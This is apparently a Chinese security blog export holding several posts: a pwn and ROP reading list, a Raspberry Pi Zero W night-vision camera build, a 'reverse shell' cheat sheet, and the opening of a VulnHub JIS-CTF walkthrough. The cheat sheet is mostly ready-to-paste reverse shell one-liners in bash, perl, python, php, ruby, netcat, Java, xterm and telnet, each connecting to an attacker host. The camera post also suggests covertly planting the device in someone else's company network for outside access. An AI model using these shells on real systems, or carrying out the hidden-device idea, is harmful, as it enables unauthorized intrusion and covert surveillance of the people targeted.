<p>使用此工具，可以在二进制文件中搜索小工具，以方便对ROP的利用。ROPgadget在x86，x64，ARM，ARM64，PowerPC，SPARC和MIPS体系结构上支持ELF/PE/Mach-O格式。从版本5开始，ROPgadget具有一个新的内核，该内核使用Capstone反汇编框架以Python形式为小工具搜索引擎编写-较旧的版本可以在Archives目录中找到，但将无法维护。</p>
<h3 id="Shellcoding-for-Linux-and-Windows-Tutorial"><a href="#Shellcoding-for-Linux-and-Windows-Tutorial" class="headerlink" title="Shellcoding for Linux and Windows Tutorial"></a>Shellcoding for Linux and Windows Tutorial</h3><p><span class="exturl" data-url="aHR0cDovL3d3dy52aXZpZG1hY2hpbmVzLmNvbS9zaGVsbGNvZGUvc2hlbGxjb2RlLmh0bWw=">Shellcoding for Linux and Windows Tutorial<i class="fa fa-external-link-alt"></i></span></p>
<p>在计算机安全性方面，从最字面意义上来说，shellcoding意味着编写代码，这些代码在执行时将返回一个远程shell。Shellcode的含义已经发展，现在代表了将插入到漏洞利用中以完成所需任务的任何字节码。</p>
<h3 id="Bypassing-non-executable-stack-during-exploitation-using-return-to-libc"><a href="#Bypassing-non-executable-stack-during-exploitation-using-return-to-libc" class="headerlink" title="Bypassing non-executable-stack during exploitation using return-to-libc"></a>Bypassing non-executable-stack during exploitation using return-to-libc</h3><p><span class="exturl" data-url="aHR0cDovL2Nzcy5jc2FpbC5taXQuZWR1LzYuODU4LzIwMTQvcmVhZGluZ3MvcmV0dXJuLXRvLWxpYmMucGRm">Bypassing non-executable-stack during exploitation using return-to-libc<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="用于X86-64的LINUX系统调用表"><a href="#用于X86-64的LINUX系统调用表" class="headerlink" title="用于X86/64的LINUX系统调用表"></a>用于X86/64的LINUX系统调用表</h3><p><span class="exturl" data-url="aHR0cDovL2Jsb2cucmNoYXBtYW4ub3JnL3Bvc3RzL0xpbnV4X1N5c3RlbV9DYWxsX1RhYmxlX2Zvcl94ODZfNjQv">用于X86/64的LINUX系统调用表<i class="fa fa-external-link-alt"></i></span></p>
<h4 id="pwn以及缓冲区溢出学习文章推荐"><a href="#pwn以及缓冲区溢出学习文章推荐" class="headerlink" title="pwn以及缓冲区溢出学习文章推荐"></a>pwn以及缓冲区溢出学习文章推荐</h4><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC9iYjA4MTYyOGEwODM=">栈的缓冲区溢出详解<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vd2ludHJ5c2VjL3AvMTA0ODMxNTQuaHRtbA==">Linux_x86_Pwn溢出漏洞<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC80N2Q0ODRiOTIyN2U=">栈溢出攻击及防护方法简介<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC83MjQxMWQ4Y2UyYWE=">缓冲区溢出攻击<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC8wMDYxMTc3ZTAzNTU=">通用shellcode的编写-调用-实验缓冲区溢出攻击-非远程-调用shellcode实例一<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC82MmVhYjU2MjA0OTA=">通用shellcode的编写-调用-实验缓冲区溢出攻击-非远程-调用shellcode实例二<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>pwn</category>
        <category>poc</category>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>raspberry pi zero w 搭建移动夜视摄像头，利用手机随时监控</title>
    <url>/2018/12/06/raspberry-pi-zero-w-night-vision-camera/</url>
    <content><![CDATA[<p><font color="red"><strong>*最近闲着没事干，突发奇想，趁着刚买了pi zero，就想自己搭建个无线<br>夜视摄像头玩玩。其实这个的实用性蛮高的，可以当做夜视仪，高清延时摄影，监控，等等，超多功能。<br>*</strong></font></p>
<p><font color="blue">好了，废话不多说，下面我就来教大家如何利用现有工具，低成本搭建一<br>个可以用手机控制的高清夜视移动摄像头！</font></p>
<a id="more"></a>

<h3 id="STEP1-准备必备的硬件和物品如下图所示："><a href="#STEP1-准备必备的硬件和物品如下图所示：" class="headerlink" title="STEP1.准备必备的硬件和物品如下图所示："></a><strong><em>STEP1.</em></strong>准备必备的硬件和物品如下图所示：</h3><p><img src="/images/pi1.jpg" alt="准备硬件"></p>
<ul>
<li><input checked="" disabled="" type="checkbox"> 充电宝（供电）</li>
<li><input checked="" disabled="" type="checkbox"> 夜视摄像头</li>
<li><input checked="" disabled="" type="checkbox"> pi zero wh</li>
<li><input checked="" disabled="" type="checkbox"> sd卡及sd卡套</li>
<li><input checked="" disabled="" type="checkbox"> pi zero w摄像头排线</li>
<li><input checked="" disabled="" type="checkbox"> usb数据线</li>
</ul>
<p><strong>然后按照下图所示组装好pi zero w和摄像头</strong></p>
<p><img src="/images/pi2.jpg" alt="组装"></p>
<h3 id="STEP2-给sd卡烧写树莓派的官方系统"><a href="#STEP2-给sd卡烧写树莓派的官方系统" class="headerlink" title="STEP2.给sd卡烧写树莓派的官方系统:"></a><strong><em>STEP2.</em></strong>给sd卡烧写树莓派的官方系统:</h3><p><img src="/images/pi3.jpg" alt="烧写系统"></p>
<p><img src="/images/pi4.jpg" alt="烧写系统"></p>
<p><em>然后静静等待烧写完成即可</em></p>
<p>烧写完成后话需要按照下面几张图修改一下配置文件，不然连接不上ssh</p>
<p>首先先增加一个无后缀名的ssh文件，然后按照下面的图增加一些代码</p>
<p><img src="/images/pi14.jpg" alt="烧写系统"></p>
<p><img src="/images/pi15.jpg" alt="烧写系统"></p>
<p><img src="/images/pi16.jpg" alt="烧写系统"></p>
<h3 id="STEP3-给pi插上sd卡开机上电"><a href="#STEP3-给pi插上sd卡开机上电" class="headerlink" title="STEP3.给pi插上sd卡开机上电:"></a><strong><em>STEP3.</em></strong>给pi插上sd卡开机上电:</h3><p>首先树莓派插上电脑之前，需要确认电脑是否安装了Bonjour</p>
<p><img src="/images/pi5.jpg" alt="上电"></p>
<p>如果插上电脑，识别为串口设备，还需要安装RNDIS驱动(google搜索RNDIS驱动下载即可)</p>
<p><img src="/images/pi6.jpg" alt="上电"></p>
<p><img src="/images/pi7.jpg" alt="上电"></p>
<p>在设备管理器中更新设备驱动程序即可</p>
<p>打开xshell，照下图设置完后，弹出输入用户名和密码，用户名:pi,密码:raspberry<br>输入后登陆即可。</p>
<p><img src="/images/pi8.jpg" alt="上电"></p>
<p><img src="/images/pi9.jpg" alt="上电"></p>
<h3 id="STEP4-开启摄像头"><a href="#STEP4-开启摄像头" class="headerlink" title="STEP4.开启摄像头:"></a><strong><em>STEP4.</em></strong>开启摄像头:</h3><p>输入以下命令:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo passwd root</span><br></pre></td></tr></table></figure>

<p>然后输入两次你想要的root用户密码，以免以后总是要输入sudo</p>
<p>然后执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">raspi-config</span><br></pre></td></tr></table></figure>
<p><img src="/images/pi10.jpg" alt="开启"></p>
<p><img src="/images/pi11.jpg" alt="开启"></p>
<p><img src="/images/pi12.jpg" alt="开启"></p>
<p>然后重启即可</p>
<p>输入以下命令让树莓派拍一张照片以测试摄像头</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">raspistill -t 2000 -o test.jpg</span><br></pre></td></tr></table></figure>
<p>-t表示延时2000毫秒后拍摄，-o表示输出的文件名。</p>
<p>照片如下：</p>
<p><img src="/images/pi13.jpg" alt="开启"></p>
<p>当然没调焦距所以拍出来的效果不是很好啦。</p>
<h3 id="STEP5-使摄像头具有夜视和网络监控的功能"><a href="#STEP5-使摄像头具有夜视和网络监控的功能" class="headerlink" title="STEP5.使摄像头具有夜视和网络监控的功能:"></a><strong><em>STEP5.</em></strong>使摄像头具有夜视和网络监控的功能:</h3><p>前面都是配置和测试部分，现在这个就是实现夜视摄像头核心功能的部分了</p>
<p><strong>如果pi zero w连接上电脑没有网络，照下面几张图打开网络适配器，设置网络分享，然后重启即可联网</strong></p>
<p><img src="/images/pi22.jpg" alt="网络"></p>
<p><img src="/images/pi23.jpg" alt="网络"></p>
<p><img src="/images/pi24.jpg" alt="网络"></p>
<p><font color="blue"><strong><em>RPi IR-CUT Camera默认工作在常规模式。 执行命令：sudo nano /boot/config.txt，在最后一行加入disable_camera_led=1，保存并重启树莓派后Camera将工作在夜视模式。 如需恢复到常规模式，只需删除disable_camera_led=1，保存并重启树莓派即可。 如需灵活控制显示模式，可通过树莓派的GPIO接口连接到以下位置，通过改变GPIO的电平来切换不同的模式（高电平为常规模式，低电平为夜视模式）。</em></strong></font></p>
<p>这个是基于mjpg-streamer的网络监控摄像头，基于其他的网络摄像头大家可以自己上网搜索研究，这个mjpg-streamer的流畅度和性能都不错，所以本人选它。</p>
<p>以下的安装命令都是在管理员模式下进行的：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install cmake libjpeg8-dev （安装所需组件和依赖）</span><br><span class="line"></span><br><span class="line">wget https://github.com/jacksonliam/mjpg-streamer/archive/master.zip（下载源码包）</span><br><span class="line"></span><br><span class="line">unzip master.zip（解压源码包）</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> mjpg-streamer-master/mjpg-streamer-experimental/plugins/input_raspicam （进入解压目录）</span><br><span class="line"></span><br><span class="line">nano input_raspicam.c （修改摄像头fps帧）</span><br></pre></td></tr></table></figure>

<p>找到下图几行设置，改为你想要的值即可:</p>
<p><img src="/images/pi17.jpg" alt="监控"></p>
<p>保存退出后，cd ../..切回根目录，输入make开始编译，</p>
<p>编译完成后输入以下命令启动mjpg-streamer</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./mjpg_streamer -i <span class="string">&quot;./input_raspicam.so&quot;</span> -o <span class="string">&quot;./output_http.so -w ./www&quot;</span></span><br></pre></td></tr></table></figure>

<p>接着在局域网电脑或者手机浏览器输入下面网址:</p>
<p><strong><em><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguNDMuMjI2OjgwODAv">http://192.168.43.226:8080/<i class="fa fa-external-link-alt"></i></span></em></strong></p>
<p><img src="/images/pi18.jpg" alt="监控"></p>
<p><img src="/images/pi19.jpg" alt="监控"></p>
<p><img src="/images/pi20.jpg" alt="监控"></p>
<p>即可在网页端开始夜视监控操作！</p>
<h3 id="STEP6-用手机随时随地来控制摄像头，打造移动夜视摄影"><a href="#STEP6-用手机随时随地来控制摄像头，打造移动夜视摄影" class="headerlink" title="STEP6.用手机随时随地来控制摄像头，打造移动夜视摄影:"></a><strong><em>STEP6.</em></strong>用手机随时随地来控制摄像头，打造移动夜视摄影:</h3><p>首先要让pi zero w支持vnc远程登陆，运行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install tightvncserver</span><br></pre></td></tr></table></figure>

<p>然后输入：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tightvncserver</span><br></pre></td></tr></table></figure>
<p>这时根据提示输入密码两次，远程登录桌面的密码，待会儿连接时需要输入这个密码才能连接成功。</p>
<p>最后输出一大段话，只看最后，是一个数字.log，第一次应该是1.log，这时就可以远程桌面连接了（桌面系统启动需要一点时间，这时马上连接的话能连接成功，但是没有图像，等待半分钟左右出现图像）。</p>
<p>Windows下使用VNC-Viewer软件，输入IP：刚才log前面的数字，这里就是你的树莓派的IP:1了，IP可以用ifconfig命令查看，然后输入密码。 </p>
<p>登陆成功，接着连接手机热点的wifi，以便树莓派每次开机自启时，都连接到自己手机的热点。</p>
<p><img src="/images/pi21.jpg" alt="手机"></p>
<p>然后输入poweroff，关机，拔出usb数据线。</p>
<h3 id="STEP7-连接上充电宝，开始用手机远程控制，并监控"><a href="#STEP7-连接上充电宝，开始用手机远程控制，并监控" class="headerlink" title="STEP7.连接上充电宝，开始用手机远程控制，并监控:"></a><strong><em>STEP7.</em></strong>连接上充电宝，开始用手机远程控制，并监控:</h3><p>按下图所示连接充电宝，上电（其实只要有供电源就行）</p>
<p><img src="/images/pi25.jpg" alt="手机"></p>
<p>开启手机热点并等待几分钟后，pi zero w会自动连接上热点，然后照下图所示设置ssh</p>
<p><img src="/images/pi26.jpg" alt="手机"></p>
<p><img src="/images/pi27.jpg" alt="手机"></p>
<p>在前面几个步骤中记下wlan0的ip地址以便连接ssh，如下图成功连接ssh，并执行来开启摄像头的命令</p>
<p><img src="/images/pi28.jpg" alt="手机"></p>
<p><img src="/images/pi29.jpg" alt="手机"></p>
<p>看下面几张图，用手机成功远程控制摄像头，并且可以夜视，非常强悍！</p>
<p><img src="/images/pi30.jpg" alt="手机"></p>
<p><img src="/images/pi31.jpg" alt="手机"></p>
<p><img src="/images/pi32.jpg" alt="手机"></p>
<p>下面是手机端vnc viewer连接树莓派的效果图，如果将pi zero w偷偷安装在别人公司里，并连接上公司的内网，再设置下端口映射，就可以通过外网来访问安放在公司内网的pi zero w了！（有什么用自己脑补）</p>
<p><img src="/images/pi33.jpg" alt="手机"></p>
<h4 id="更多有关于pi-zero-w的用法，请关注本人的博客，你本人会不定时更新更多内容！谢谢浏览！"><a href="#更多有关于pi-zero-w的用法，请关注本人的博客，你本人会不定时更新更多内容！谢谢浏览！" class="headerlink" title="更多有关于pi zero w的用法，请关注本人的博客，你本人会不定时更新更多内容！谢谢浏览！"></a><font color="red"><strong><em>更多有关于pi zero w的用法，请关注本人的博客，你本人会不定时更新更多内容！谢谢浏览！</em></strong></h4>]]></content>
      <categories>
        <category>制作</category>
      </categories>
      <tags>
        <tag>raspberrypi zero w</tag>
        <tag>智能硬件</tag>
      </tags>
  </entry>
  <entry>
    <title>reverse shell 大全</title>
    <url>/2020/01/20/reverse-shell/</url>
    <content><![CDATA[<p>如果您很幸运在渗透测试期间发现了命令执行漏洞，那么不久之后您可能会需要一个交互式shell。</p>
<p>如果无法添加新帐户/SSH密钥/.rhosts文件并仅登录，则下一步可能是使用reverse shell或将shell绑定到TCP端口。此页面涉及前者。创建reverse shell程序的选项受目标系统上安装的脚本语言的限制-尽管如果准备充分，也可以上传二进制程序。显示的示例是针对类Unix系统量身定制的。如果将“/bin/sh -i”替换为“cmd.exe”，则以下某些示例在Windows上也应适用。</p>
<p>下面的每种方法都旨在成为一种可以复制/粘贴的方式。因此，它们的行很短，但可读性很差。</p>
<a id="more"></a>

<h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><ul>
<li>某些版本的bash可以向您发送reverse shell（已在Ubuntu 10.10上进行了测试）：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<ul>
<li>Bash shell的替代品：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> /bin/bash 0&amp;0 2&gt;&amp;0</span><br><span class="line"></span><br><span class="line">Or:</span><br><span class="line">0&lt;&amp;196;<span class="built_in">exec</span> 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br><span class="line"></span><br><span class="line">Or:</span><br><span class="line"><span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/attackerip/4444</span><br><span class="line">cat &lt;&amp;5 | <span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span> <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="keyword">done</span>  </span><br><span class="line">or:</span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> line 0&lt;&amp;5; <span class="keyword">do</span> <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<ul>
<li>现在，本地侦听服务器中键入的所有内容都将在目标上执行，并且命令的输出将通过管道返回。请记住，我们不在目标上使用任何第三方工具，而是在其默认shell程序上使用。该技术在许多情况下都很方便，并且在目标系统上只占很小的空间。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nc -l -p 8080 -vvv</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/evil.com/8080</span><br><span class="line">$ cat &lt;&amp;5 | <span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span> <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<ul>
<li>端口扫描：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> 79 80 81; <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">$i</span> &amp; bash -i &gt;&amp; /dev/tcp/192.168.1.1/<span class="variable">$i</span> 0&gt;&amp;1;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<ul>
<li>禁用了GAPING_SECURITY_HOLE的netcat：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mknod backpipe p &amp;&amp; nc 192.168.56.11 8888 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br></pre></td></tr></table></figure>

<ul>
<li>没有netcat的netcat：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/bin/bash -i &gt; /dev/tcp/192.168.56.110/8080 0&lt;&amp;1 2&gt;&amp;1</span><br></pre></td></tr></table></figure>

<ul>
<li>没有netcat或/dev/tcp的netcat：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mknod backpipe p &amp;&amp; telnet 192.168.56.114 2336 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br></pre></td></tr></table></figure>

<ul>
<li>telnet-to-telnet:<br>我不确定为什么要使用这种技术，但这是一个选择，因此仍然可以使用。这显然是最丑陋的技术。此技术使用连接到远程侦听器的两个telnet会话，将输入从一个telnet会话传递到/bin/bash，然后将输出传递到第二个telnet会话。命令输入到攻击者侦听器中的一个侦听器中，并且在另一个侦听器上接收反馈。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/bin/bash | telnet 192.168.56.110 8899</span><br></pre></td></tr></table></figure>

<h3 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h3><ul>
<li>这是perl-reverse-shell的简短，无功能版本：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>不依赖/bin/sh的较短的Perl反向shell：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">perl -MIO -e <span class="string">&#x27;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>如果目标系统正在运行Windows，请使用以下单行代码：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">perl -MIO -e <span class="string">&#x27;$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><ul>
<li>这已在Linux/Python 2.7下进行了测试：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><ul>
<li>该代码假定TCP连接使用文件描述符3.在我的测试系统上有效。如果不起作用，请尝试4、5、6…</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>
<p>如果要上传.php文件，请参见功能更强大的php-reverse-shell。</p>
<h3 id="ruby"><a href="#ruby" class="headerlink" title="ruby"></a>ruby</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e<span class="string">&#x27;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>不依赖/bin/sh的更长的Ruby反向shell：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">&#x27;exit if fork;c=TCPSocket.new(&quot;attackerip&quot;,&quot;4444&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>如果目标系统正在运行Windows，请使用以下单行代码：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">&#x27;c=TCPSocket.new(&quot;attackerip&quot;,&quot;4444&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h3><ul>
<li>Netcat在生产系统上很少出现，即使有多个版本的Netcat，其中一些也不支持-e选项。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -e /bin/sh 10.0.0.1 1234</span><br></pre></td></tr></table></figure>

<ul>
<li>如果您安装了错误的netcat版本，Jeff Price在这里指出，您仍然可以像下面这样获得reverse shell：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</span><br></pre></td></tr></table></figure>

<ul>
<li>其他可能的Netcat reverse Shell，取决于Netcat版本和编译标志：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -c /bin/sh attackerip 4444</span><br><span class="line">Or:</span><br><span class="line">/bin/sh | nc attackerip 4444</span><br><span class="line">Or:</span><br><span class="line">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc attackerip 4444 0/tmp/p</span><br></pre></td></tr></table></figure>

<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>

<h3 id="xterm"><a href="#xterm" class="headerlink" title="xterm"></a>xterm</h3><ul>
<li>reverse shell的最简单形式之一是xterm会话。以下命令应在服务器上运行。它将尝试通过TCP端口6001重新连接到您（10.0.0.1）。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xterm -display 10.0.0.1:1</span><br><span class="line">Or:</span><br><span class="line">$ DISPLAY=attackerip:0 xterm</span><br></pre></td></tr></table></figure>

<ul>
<li>要捕获传入的xterm，请启动X服务器（：1 –侦听TCP端口6001）。一种方法是使用Xnest（在您的系统上运行）：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Xnest :1</span><br></pre></td></tr></table></figure>

<ul>
<li>您需要授权目标连接到您（命令也在主机上运行）：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xhost +targetip</span><br></pre></td></tr></table></figure>

<h3 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h3><ul>
<li>当然，您也可以使用Telnet替代Netcat：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet attackerip 4444 0/tmp/p</span><br><span class="line">Or:</span><br><span class="line">telnet attackerip 4444 | /bin/bash | telnet attackerip 4445   <span class="comment"># Remember to listen on your machine also on port 4445/tcp</span></span><br></pre></td></tr></table></figure>

<h3 id="RCE-shell"><a href="#RCE-shell" class="headerlink" title="RCE shell"></a>RCE shell</h3><ul>
<li>这个有点作弊。这仅适用于远程命令执行漏洞。编写了一个小的python脚本，而不是将命令手动输入到代理或浏览器url中，从而为您提供了shell的感觉，而没有产生任何与目标相反的内容。您只需向脚本传递易受攻击的url，并将可注入字段替换为’<rce>‘标记，即可为您提供一个干净的界面来输入命令。在后台，脚本将请求发送到Web服务器，解析响应并将其呈现给您。</li>
</ul>
<p><img src="https://www.lanmaster53.com/static/images/posts/sh_rce.png"></p>
<h3 id="通过交互式控制台的PHP-reverse-Shell"><a href="#通过交互式控制台的PHP-reverse-Shell" class="headerlink" title="通过交互式控制台的PHP-reverse-Shell"></a>通过交互式控制台的PHP-reverse-Shell</h3><ul>
<li>最后一种技术是利用php交互式控制台。攻击者发出一个命令，该命令移至/tmp目录（因为它通常在world范围内可写），使用wget下载恶意php-reverse-tcp后门（攻击者将其托管在他控制的Web服务器上），然后通过交互式控制台。</li>
</ul>
<p><img src="https://www.lanmaster53.com/static/images/posts/sh_php.png"></p>
]]></content>
      <categories>
        <category>reverse shell</category>
      </categories>
      <tags>
        <tag>reverse shell</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[JIS-CTF-VulnUpload]</title>
    <url>/2019/12/07/vulnhub-JIS-CTF-VulnUpload/</url>
    <content><![CDATA[<p>i春秋平台的ctf题目已经被我做的差不多了，最近实在是手痒，又在网上搜了搜练习靶场，发现其它ctf平台的题目都不如i春秋，然后我看到有很多网友在玩vulnhub靶场，然后我从网上了解了下vulnhub，确实不错，类似于ctf，难度也可以，每个靶场有多个flag，<span class="exturl" data-url="aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20v">vulnhub官网<i class="fa fa-external-link-alt"></i></span></p>
<p>vulnhub每隔一段时间就会更新新的靶机，到现在其官网上可供下载的靶机已经有380个左右了，</p>
<a id="more"></a>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub1.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub2.jpg"></p>
<p>本人索性把380个左右的靶机全部下载下来了。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/exiting.jpg"></p>
<p>下面开始记录靶机的walkthrough</p>
<h4 id="JIS-CTF-VulnUpload"><a href="#JIS-CTF-VulnUpload" class="headerlink" title="JIS-CTF: VulnUpload"></a>JIS-CTF: VulnUpload</h4><p>官网下载:</p>
<ul>
<li>Download: <span class="exturl" data-url="aHR0cDovL3d3dy5tZWRpYWZpcmUuY29tL2ZpbGUvdDViNG5reW54a205aGoyL0NURjAxLm92YQ==">http://www.mediafire.com/file/t5b4nkynxkm9hj2/CTF01.ova<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9qaXNjdGYvSklTLUNURi1WdWxuVXBsb2FkLUNURjAxLm92YQ==">https://download.vulnhub.com/jisctf/JIS-CTF-VulnUpload-CTF01.ova<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9qaXNjdGYvSklTLUNURi1WdWxuVXBsb2FkLUNURjAxLm92YS50b3JyZW50">https://download.vulnhub.com/jisctf/JIS-CTF-VulnUpload-CTF01.ova.torrent <i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>描述:</p>
<ul>
<li>难度: 初学者</li>
<li>说明: 这台机器上有五个标志。 尝试找到它们。 查找所有标志平均需要1.5个小时</li>
<li>仅与VirtualBox一起使用</li>
</ul>
<h3 id="VMware网络配置"><a href="#VMware网络配置" class="headerlink" title="VMware网络配置"></a>VMware网络配置</h3><p>下面详细说明在vmware上的配置方法</p>
<p>靶机的账号口令为： technawi/3vilH@ksor<br>vmware打开虚拟机后登录然后更改root用户的密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo passwd root</span><br></pre></td></tr></table></figure>
